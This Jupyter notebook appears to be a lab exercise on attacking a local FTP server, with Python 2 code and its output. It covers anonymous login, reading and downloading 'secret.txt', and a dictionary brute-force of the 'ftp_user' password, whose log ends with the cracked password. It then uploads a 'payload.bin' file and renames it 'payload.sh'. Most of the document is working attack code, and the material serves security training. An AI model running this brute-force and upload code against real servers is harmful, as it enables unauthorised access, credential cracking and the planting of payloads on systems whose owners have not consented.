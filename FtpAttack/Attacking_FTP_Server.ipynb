{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attacking FTP Servers"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "FTP service is running on it's **default port** on the local machine.. Write code snippets to perform the given tasks.\n",
    "\n",
    "Note: A password dictionary \"password_dictionary.txt\" is present in the current working directory. \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Anonymous User"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 1:**  Check if you can login to FTP service without any authentication i.e. anonymous user?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "230 Login successful.\n",
      "221 Goodbye.\n"
     ]
    }
   ],
   "source": [
    "from ftplib import FTP\n",
    "\n",
    "hostname='localhost'\n",
    "\n",
    "# Creating object\n",
    "ftp = FTP(hostname)\n",
    "# Logging as anonymous user\n",
    "print ftp.login()\n",
    "# Disconnection\n",
    "print ftp.quit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 2:**  Print the FTP welcome banner."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "230 Login successful.\n",
      "220 Welcome to AttackDefense target FTP service.\n",
      "221 Goodbye.\n"
     ]
    }
   ],
   "source": [
    "from ftplib import FTP\n",
    "\n",
    "hostname='localhost'\n",
    "\n",
    "# Creating object\n",
    "ftp = FTP(hostname)\n",
    "# Logging as anonymous user\n",
    "print ftp.login()\n",
    "print ftp.getwelcome()\n",
    "# Disconnection\n",
    "print ftp.quit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 3:**  Print the contents of remote working directory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "drwxr-xr-x    1 65534    65534        4096 Sep 21  2018 ftp\n",
      "None\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'221 Goodbye.'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from ftplib import FTP\n",
    "\n",
    "hostname='localhost'\n",
    "\n",
    "ftp = FTP(hostname)\n",
    "ftp.login()\n",
    "\n",
    "# Listing remote working directory\n",
    "print ftp.dir()\n",
    "\n",
    "ftp.quit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 4:**  Read the content of the file \"secret.txt\" present in \"ftp\" directory of remote machine."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "drwxr-xr-x    1 65534    65534        4096 Sep 21  2018 ftp\n",
      "None\n",
      "250 Directory successfully changed.\n",
      "drwxrwxrwx    2 999      999          4096 Sep 21  2018 files\n",
      "-rw-r--r--    1 0        0              41 Sep 20  2018 secret.txt\n",
      "None\n",
      "secret nonce: thisisasecretnonce98835648\n",
      "226 Transfer complete.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'221 Goodbye.'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from ftplib import FTP\n",
    "\n",
    "hostname='localhost'\n",
    "\n",
    "ftp = FTP(hostname)\n",
    "ftp.login()\n",
    "\n",
    "print ftp.dir()\n",
    "# Changing Local working directory\n",
    "print ftp.cwd('ftp')\n",
    "print ftp.dir()\n",
    "# Reading the file\n",
    "print ftp.retrlines('RETR secret.txt')\n",
    "\n",
    "ftp.quit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 5:**  Get the file \"secret.txt\" present in \"ftp\" to local machine."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "drwxr-xr-x    1 65534    65534        4096 Sep 21  2018 ftp\n",
      "None\n",
      "250 Directory successfully changed.\n",
      "drwxrwxrwx    2 999      999          4096 Sep 21  2018 files\n",
      "-rw-r--r--    1 0        0              41 Sep 20  2018 secret.txt\n",
      "None\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'221 Goodbye.'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from ftplib import FTP\n",
    "\n",
    "hostname='localhost'\n",
    "\n",
    "ftp = FTP(hostname)\n",
    "ftp.login()\n",
    "\n",
    "print ftp.dir()\n",
    "# Changing Local working directory\n",
    "print ftp.cwd('ftp')\n",
    "print ftp.dir()\n",
    "\n",
    "# Copying the file\n",
    "write_file = open('secret.txt', 'wb')\n",
    "ftp.retrbinary('RETR secret.txt', write_file.write, 8*1024)\n",
    "write_file.close()\n",
    "\n",
    "# You can check this file in your wordking directory\n",
    "\n",
    "ftp.quit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Authenticated User"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 6:**  Figure out the password for user \"ftp_user\" by bruteforcing the FTP login. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying with password:  123456\n",
      "Trying with password:  12345\n",
      "Trying with password:  1234\n",
      "Trying with password:  1234567\n",
      "Trying with password:  dragon\n",
      "Trying with password:  dragon\n",
      "Trying with password:  baseball\n",
      "Trying with password:  abc123\n",
      "Trying with password:  letmein\n",
      "Trying with password:  696969\n",
      "Trying with password:  696969\n",
      "Trying with password:  shadow\n",
      "Trying with password:  michael\n",
      "Trying with password:  654321\n",
      "Trying with password:  superman\n",
      "Trying with password:  superman\n",
      "Trying with password:  1qaz2wsx\n",
      "Trying with password:  7777777\n",
      "Trying with password:  121212\n",
      "Trying with password:  000000\n",
      "Trying with password:  000000\n",
      "Trying with password:  qazwsx\n",
      "Trying with password:  123qwe\n",
      "Trying with password:  killer\n",
      "Trying with password:  trustno1\n",
      "Trying with password:  trustno1\n",
      "Trying with password:  jordan\n",
      "Trying with password:  jennifer\n",
      "Trying with password:  zxcvbnm\n",
      "Trying with password:  asdfgh\n",
      "Trying with password:  asdfgh\n",
      "Trying with password:  hunter\n",
      "Trying with password:  buster\n",
      "Trying with password:  soccer\n",
      "Trying with password:  harley\n",
      "Trying with password:  harley\n",
      "Trying with password:  batman\n",
      "Trying with password:  andrew\n",
      "Trying with password:  tigger\n",
      "Trying with password:  sunshine\n",
      "Trying with password:  sunshine\n",
      "Trying with password:  iloveyou\n",
      "Trying with password:  2000\n",
      "Trying with password:  charlie\n",
      "Trying with password:  robert\n",
      "Trying with password:  robert\n",
      "Trying with password:  thomas\n",
      "Trying with password:  hockey\n",
      "Trying with password:  ranger\n",
      "Trying with password:  daniel\n",
      "Trying with password:  daniel\n",
      "Trying with password:  starwars\n",
      "Trying with password:  klaster\n",
      "Trying with password:  112233\n",
      "Trying with password:  george\n",
      "Trying with password:  george\n",
      "Trying with password:  computer\n",
      "Trying with password:  maggie\n",
      "Trying with password:  159753\n",
      "Trying with password:  aaaaaa\n",
      "Trying with password:  aaaaaa\n",
      "Trying with password:  ginger\n",
      "Trying with password:  princess\n",
      "Trying with password:  joshua\n",
      "Trying with password:  cheese\n",
      "Trying with password:  cheese\n",
      "Trying with password:  amanda\n",
      "Trying with password:  summer\n",
      "Trying with password:  love\n",
      "Trying with password:  ashley\n",
      "Trying with password:  ashley\n",
      "Trying with password:  6969\n",
      "Trying with password:  nicole\n",
      "Trying with password:  chelsea\n",
      "Trying with password:  matthew\n",
      "Trying with password:  matthew\n",
      "Trying with password:  access\n",
      "Trying with password:  diamond\n",
      "Trying with password:  1234qwer\n",
      "Trying with password:  gfhjkm\n",
      "Trying with password:  gfhjkm\n",
      "Trying with password:  silver\n",
      "Trying with password:  222222\n",
      "Trying with password:  88888888\n",
      "Trying with password:  anthony\n",
      "Trying with password:  anthony\n",
      "Trying with password:  justin\n",
      "Trying with password:  bailey\n",
      "Trying with password:  q1w2e3r4t5\n",
      "Trying with password:  internet\n",
      "Trying with password:  internet\n",
      "Trying with password:  scooter\n",
      "Trying with password:  golfer\n",
      "Trying with password:  cookie\n",
      "Trying with password:  phoenix\n",
      "Trying with password:  phoenix\n",
      "Trying with password:  camaro\n",
      "Trying with password:  sexy\n",
      "Trying with password:  welcome@234\n",
      "Trying with password:  peanut\n",
      "Trying with password:  peanut\n",
      "Trying with password:  morgan\n",
      "Trying with password:  andrea\n",
      "Trying with password:  smokey\n",
      "Trying with password:  steelers\n",
      "Trying with password:  steelers\n",
      "Trying with password:  joseph\n",
      "Trying with password:  mercedes\n",
      "Trying with password:  dakota\n",
      "Trying with password:  arsenal\n",
      "Trying with password:  arsenal\n",
      "Trying with password:  qwer1234\n",
      "230 Login successful.\n",
      "Login successful with password:  qwer1234\n",
      "221 Goodbye.\n"
     ]
    }
   ],
   "source": [
    "from ftplib import FTP\n",
    "import sys, socket\n",
    "\n",
    "hostname='localhost'\n",
    "username='ftp_user'\n",
    "password_dict=\"password_dictionary.txt\"\n",
    "\n",
    "# Creating object\n",
    "ftp = FTP(hostname)\n",
    "# Logging as anonymous user\n",
    "\n",
    "# Loading the password dictionary and Striping \\n\n",
    "lines = [line.rstrip('\\n') for line in open(password_dict)]\n",
    "\n",
    "itr = 0\n",
    "# Iterating over dictionary\n",
    "while itr < len(lines):\n",
    "    password = lines[itr]\n",
    "    try:\n",
    "        print \"Trying with password: \",password\n",
    "        print ftp.login(username, password)\n",
    "        print \"Login successful with password: \",password\n",
    "        break\n",
    "    # To handle disconnection\n",
    "    except socket.error as error:\n",
    "        # Again connecting\n",
    "        ftp = FTP(hostname)\n",
    "    # To handle Login incorrect \n",
    "    except Exception, e:\n",
    "        itr = itr + 1\n",
    "        \n",
    "        \n",
    "# Disconnection\n",
    "print ftp.quit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 7:** Copy \"payload.bin\" file from present working directory to \"ftp/files\" directory of the remote machine."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "230 Login successful.\n",
      "drwxrwxrwx    1 999      999          4096 Sep 08 13:52 files\n",
      "-rw-r--r--    1 0        0              41 Sep 20  2018 secret.txt\n",
      "None\n",
      "250 Directory successfully changed.\n",
      "-rw-------    1 1001     1001           49 Sep 08 13:52 payload.bin\n",
      "None\n",
      "-rw-------    1 1001     1001           49 Sep 08 13:52 payload.bin\n",
      "None\n",
      "221 Goodbye.\n"
     ]
    }
   ],
   "source": [
    "from ftplib import FTP\n",
    "\n",
    "hostname='localhost'\n",
    "username='ftp_user'\n",
    "password='qwer1234'\n",
    "\n",
    "# Creating object\n",
    "ftp = FTP(hostname)\n",
    "\n",
    "# Logging as anonymous user\n",
    "print ftp.login(username, password)\n",
    "\n",
    "print ftp.dir()\n",
    "# Changing remote working directory\n",
    "print ftp.cwd('files')\n",
    "print ftp.dir()\n",
    "\n",
    "# Copying the file\n",
    "read_file = open('payload.bin', 'rb')\n",
    "ftp.storbinary('STOR payload.bin', read_file, 8*1024)\n",
    "read_file.close()\n",
    "\n",
    "# Verifying the trasnfer\n",
    "print ftp.dir()\n",
    "        \n",
    "# Disconnection\n",
    "print ftp.quit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Task 8:**  Rename the payload.bin file (eralier transfered to \"ftp/files\" directory) to \"payload.sh\". "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "230 Login successful.\n",
      "drwxrwxrwx    1 999      999          4096 Sep 08 13:52 files\n",
      "-rw-r--r--    1 0        0              41 Sep 20  2018 secret.txt\n",
      "None\n",
      "250 Directory successfully changed.\n",
      "-rw-------    1 1001     1001           49 Sep 08 13:52 payload.bin\n",
      "None\n",
      "-rw-------    1 1001     1001           49 Sep 08 13:52 payload.sh\n",
      "None\n",
      "221 Goodbye.\n"
     ]
    }
   ],
   "source": [
    "from ftplib import FTP\n",
    "\n",
    "hostname='localhost'\n",
    "username='ftp_user'\n",
    "password='qwer1234'\n",
    "\n",
    "# Creating object\n",
    "ftp = FTP(hostname)\n",
    "\n",
    "# Logging as anonymous user\n",
    "print ftp.login(username, password)\n",
    "\n",
    "print ftp.dir()\n",
    "# Changing remote working directory\n",
    "print ftp.cwd('files')\n",
    "print ftp.dir()\n",
    "\n",
    "# Renaming the file\n",
    "ftp.rename('payload.bin', 'payload.sh')\n",
    "\n",
    "# Verifying the trasnfer\n",
    "print ftp.dir()\n",
    "        \n",
    "# Disconnection\n",
    "print ftp.quit()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.15rc1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
